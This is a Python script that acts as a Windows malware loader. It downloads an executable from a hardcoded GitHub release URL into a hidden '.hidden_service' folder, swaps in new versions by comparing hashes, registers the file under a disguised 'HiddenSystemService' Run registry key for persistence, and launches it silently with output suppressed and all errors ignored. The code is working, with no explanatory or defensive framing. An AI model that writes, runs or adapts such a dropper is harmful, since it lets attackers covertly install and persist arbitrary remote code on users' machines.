import os
import hashlib
import urllib.request
import subprocess
from pathlib import Path
import winreg  # For adding to startup

# Hardcoded values
URL = "https://github.com/yesjdnke/manager/releases/download/love/system_service.exe"
FOLDER_NAME = ".hidden_service"
FILE_NAME = "system_service.exe"
HASH_FILE_NAME = "file_hash.txt"  # To store the hash of the downloaded file

def get_user_hidden_folder():
    """Get or create a hidden folder in the user's directory."""
    user_home = Path.home()
    hidden_folder = user_home / FOLDER_NAME
    if not hidden_folder.exists():
        hidden_folder.mkdir(parents=True, exist_ok=True)
    return hidden_folder

def download_file(url, dest):
    """Download a file from a URL."""
    with urllib.request.urlopen(url) as response, open(dest, 'wb') as out_file:
        out_file.write(response.read())

def compute_file_hash(file_path):
    """Compute the SHA256 hash of a file."""
    sha256 = hashlib.sha256()
    with open(file_path, 'rb') as f:
        while chunk := f.read(8192):
            sha256.update(chunk)
    return sha256.hexdigest()

def save_hash(hash_value, hash_file_path):
    """Save the file hash to a hash file."""
    with open(hash_file_path, 'w') as f:
        f.write(hash_value)

def load_hash(hash_file_path):
    """Load the saved hash from a hash file."""
    if not os.path.exists(hash_file_path):
        return None
    with open(hash_file_path, 'r') as f:
        return f.read().strip()

def add_to_startup(file_path):
    """Add the file to system startup."""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, "HiddenSystemService", 0, winreg.REG_SZ, str(file_path))
        winreg.CloseKey(key)
    except Exception:
        pass  # Silently fail if adding to startup is not possible

def ensure_and_run_file():
    """
    Ensure the file is downloaded, hashed, executed, and added to startup.
    - Downloads if missing.
    - Saves and compares hashes to delete/replace files as needed.
    - Adds to system startup on the first download or replacement.
    - Runs the file after ensuring it is present.
    """
    hidden_folder = get_user_hidden_folder()
    file_path = hidden_folder / FILE_NAME
    hash_file_path = hidden_folder / HASH_FILE_NAME

    saved_hash = load_hash(hash_file_path)

    # Download and check the new file's hash
    new_file_path = hidden_folder / f"new_{FILE_NAME}"
    try:
        download_file(URL, new_file_path)
        new_file_hash = compute_file_hash(new_file_path)
    except Exception:
        return  # Exit silently if download or hashing fails

    if saved_hash == new_file_hash:
        # If the hash matches, delete the new file
        os.remove(new_file_path)
    else:
        # If the hash doesn't match, replace the old file
        if file_path.exists():
            os.remove(file_path)  # Remove the current file
        os.rename(new_file_path, file_path)  # Replace with the new file
        save_hash(new_file_hash, hash_file_path)  # Save the new hash

        # Add to startup (only on replacement or first download)
        add_to_startup(file_path)

    # Run the file in a non-blocking way
    try:
        subprocess.Popen([str(file_path)], shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass  # Silently fail if the file cannot be executed
